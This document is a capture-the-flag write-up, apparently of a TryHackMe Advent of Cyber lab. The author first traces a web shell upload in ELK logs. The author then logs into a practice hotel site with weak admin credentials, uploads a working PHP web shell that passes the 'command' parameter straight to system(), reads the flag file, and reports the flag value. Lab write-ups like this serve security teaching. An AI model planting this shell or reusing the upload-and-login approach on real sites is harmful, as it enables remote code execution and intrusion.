## Operation BLUE
In this part we learn to use ELK, to analyse logs and investigate a particular attack.
+ Firstly we open Elastic then set the collection to `frostypines-resorts`.
+ After that we set the time frame from 11:30, October 3rd 2024 to 12:00, October 3rd 2024.

### Where was the web shell uploaded to?
Firstly we add `message` and `clientip` columns as those are the info that is of interest to us. Then we add the following filter: `message: "shell.php"` to filter out the logs that include instances of the web shell being uploaded somewhere. Here we can see the path: `/media/images/rooms/shell.php`
### What IP address accessed the web shell?
Firstly we add `message` and `clientip` columns as those are the info that is of interest to us. Then we add the following filter: `message: "shell.php"` to filter out the logs that include instances of the web shell being uploaded somewhere. We get two ip addresses. One does not run any commands thus it is not malicious while the other is running commands thus making it malicious. The ip address which runs these commands is `10.11.83.34`.

## Operation RED
+ Firstly we type in `echo “IP frostypines.thm” >> /etc/hosts` in the terminal so that we can acces the website.
+ Now inspecting the site and going to the login page, I tried using the examples of "weak credentials" which were given and the combination of `admin@frostypines.thm` and `admin` gave me acces to the admin account.
+ Now after inspecting a little more we can see that only the `Add Room` section allows us to upload files to the web page and maybe we can upload our script here.
+ Now we save the code given in the AoC room as `exploit.php` using `nano`.
  ```
  <html>
  <body>
  <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
  <input type="text" name="command" autofocus id="command" size="50">
  <input type="submit" value="Execute">
  </form>
  <pre>
  <?php
      if(isset($_GET['command'])) 
      {
          system($_GET['command'] . ' 2>&1'); 
      }
  ?>
  </pre>
  </body>
  </html>
  ```
+ Now we add `exploit.php` after clicking `Add Room`.
+ Now right clicking on the image of the last room added and opening it in the new tab we can see that our exploit is working.
+ We type in `ls` to view the files and we can see that there is a file named `flag.txt`. We now do `cat flag.txt` to view the contents of the file.

## What is the contents of the flag.txt?
After typing in `cat flag.txt` we get the answer which is `THM{Gl1tch_Was_H3r3}`.

## What I Learned
+ Became familiar with `ELK`.
+ Learned that exploiting web pages is easy when they dont check the type of the file we are uploading thus making them vulnerable to `RCE`.
